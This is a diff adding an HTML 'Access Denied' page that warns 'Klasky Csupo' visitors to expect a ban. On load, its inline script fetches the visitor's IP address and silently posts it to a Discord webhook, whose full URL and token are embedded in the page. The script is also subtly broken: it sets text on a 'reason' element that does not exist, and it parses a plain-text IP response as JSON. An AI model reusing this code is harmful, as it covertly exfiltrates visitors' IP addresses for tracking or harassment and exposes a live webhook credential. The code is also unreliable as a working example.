@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Access Denied</title>
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
+  <style>
+    @font-face {
+  font-family: 'Teletoon';
+  src: url('https://giggityfiles.github.io/a/TeleToon.ttf') format('truetype');
+  font-weight: normal;
+  font-style: normal;
+}
+
+
+
+    body {
+      font-family: 'Teletoon', sans-serif;
+      background-color: #111;
+      color: #fff;
+      text-align: center;
+      padding-top: 15%;
+    }
+    h1 {
+      color: #ff4444;
+      font-size: 2.5em;
+    }
+    p {
+      font-size: 1.2em;
+      margin: 10px 0;
+    }
+    a {
+      color: #00aaff;
+      text-decoration: none;
+      font-weight: bold;
+    }
+    a:hover {
+      text-decoration: underline;
+    }
+  </style>
+</head>
+<body>
+  <h1>Klasky Csupo Detected</h1>
+  <p>Entering any klasky csupo related content has been denied.</p>
+  <p>Expect a ban.</p>
+  <script>
+    const params = new URLSearchParams(window.location.search);
+    const reason = params.get('reason') || 'Unknown';
+    document.getElementById('reason').textContent = decodeURIComponent(reason);
+
+    fetch("https://ipv4.icanhazip.com/t")
+      .then(r => r.json())
+      .then(data => {
+        const ip = data.ip;
+        const payload = { content: `Logokid Detected: **${ip}**` };
+        fetch("https://discord.com/api/webhooks/1427405408594563114/Nn8X1om_NDZqJ30DeYG2pdsX6saORVT0p4DGIxMQ41kMUnXQmebZkdLQbOKmW_viNPcE", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(payload)
+        }).catch(() => {});
+      })
+      .catch(() => {});
+  </script>
+  
+  <script src="/shark.js"></script>
+</body>
+</html>
